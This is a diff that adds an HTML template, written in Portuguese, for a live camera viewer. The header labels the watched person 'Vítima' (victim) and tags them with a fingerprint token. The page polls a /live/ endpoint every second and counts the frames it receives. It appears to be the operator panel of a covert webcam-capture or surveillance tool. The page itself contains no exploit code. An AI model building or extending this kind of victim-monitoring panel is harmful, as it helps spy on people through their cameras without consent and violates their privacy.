@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Feed — {{ fp_token[:8] }}…</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0d0d0d;
+      color: #e0e0e0;
+      font-family: "Segoe UI", monospace, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .header {
+      width: 100%;
+      max-width: 800px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .title {
+      font-size: 14px;
+      color: #aaa;
+    }
+
+    .live-badge {
+      background: #c62828;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 12px;
+      letter-spacing: 1px;
+      animation: pulse 1.5s infinite;
+    }
+
+    .offline-badge {
+      background: #555;
+      color: #ccc;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 12px;
+      letter-spacing: 1px;
+      display: none;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.6; }
+    }
+
+    .feed-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 800px;
+      background: #111;
+      border: 2px solid #c62828;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    #feed {
+      width: 100%;
+      display: block;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 8px; left: 8px;
+      font-size: 11px;
+      color: rgba(255,255,255,0.7);
+      font-family: monospace;
+    }
+
+    .no-feed {
+      padding: 80px 0;
+      text-align: center;
+      color: #555;
+      font-size: 14px;
+      display: none;
+    }
+
+    .stats {
+      margin-top: 12px;
+      font-size: 12px;
+      color: #666;
+      width: 100%;
+      max-width: 800px;
+      display: flex;
+      gap: 24px;
+    }
+
+    .stats span { color: #999; }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="title">
+      🎯 Vítima · <code style="color:#e91e63">{{ fp_token[:16] }}…</code>
+    </div>
+    <div>
+      <span class="live-badge"  id="badge-live">● LIVE</span>
+      <span class="offline-badge" id="badge-offline">● OFFLINE</span>
+    </div>
+  </div>
+
+  <div class="feed-wrapper">
+    <img id="feed" src="/live/{{ fp_token }}" alt="live feed" />
+    <div class="overlay" id="overlay">--:--:--</div>
+    <div class="no-feed" id="no-feed">📷 Aguardando câmara…</div>
+  </div>
+
+  <div class="stats">
+    <div>Frames recebidos: <span id="frame-count">0</span></div>
+    <div>Último frame: <span id="last-ts">—</span></div>
+    <div>FP Token: <span><code>{{ fp_token }}</code></span></div>
+  </div>
+
+  <script>
+    const FP_TOKEN   = "{{ fp_token }}";
+    const feedImg    = document.getElementById("feed");
+    const overlay    = document.getElementById("overlay");
+    const badgeLive  = document.getElementById("badge-live");
+    const badgeOff   = document.getElementById("badge-offline");
+    const noFeed     = document.getElementById("no-feed");
+    const frameCount = document.getElementById("frame-count");
+    const lastTs     = document.getElementById("last-ts");
+
+    let count   = 0;
+    let offline = 0;   // contagem de falhas consecutivas
+
+    function refresh() {
+      const ts = Date.now();
+      const url = `/live/${FP_TOKEN}?t=${ts}`;
+      const img = new Image();
+
+      img.onload = () => {
+        feedImg.src = url;
+        count++;
+        offline = 0;
+        frameCount.textContent = count;
+        lastTs.textContent = new Date().toLocaleTimeString();
+        overlay.textContent = new Date().toLocaleTimeString();
+        noFeed.style.display   = "none";
+        feedImg.style.display  = "block";
+        badgeLive.style.display  = "inline-block";
+        badgeOff.style.display   = "none";
+      };
+
+      img.onerror = () => {
+        offline++;
+        if (offline >= 4) {
+          // Sem frames há ~4 segundos → offline
+          badgeLive.style.display  = "none";
+          badgeOff.style.display   = "inline-block";
+          if (count === 0) {
+            noFeed.style.display  = "block";
+            feedImg.style.display = "none";
+          }
+        }
+      };
+
+      img.src = url;
+    }
+
+    // Atualiza a cada 1 segundo
+    setInterval(refresh, 1000);
+    refresh();
+  </script>
+</body>
+</html>
